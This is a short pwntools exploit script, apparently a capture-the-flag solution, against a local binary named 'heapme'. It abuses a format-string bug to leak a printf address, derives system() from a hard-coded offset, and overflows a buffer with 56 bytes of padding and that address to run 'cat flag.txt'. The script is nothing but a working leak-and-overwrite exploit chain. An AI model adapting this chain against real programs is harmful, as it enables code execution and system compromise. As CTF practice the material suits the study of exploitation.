from pwn import *
from struct import pack

context.arch = 'amd64'
context.os = 'linux'

io = process('./heapme')
io.sendline(b'%lx'*2)
addr = int(io.clean()[12:24], 16) # Leaked address of printf
addr = pack('<Q', addr - 88608) # Offset between printf and system
io.sendline(b'a'* 56 + addr + b'cat flag.txt')
print(io.clean())
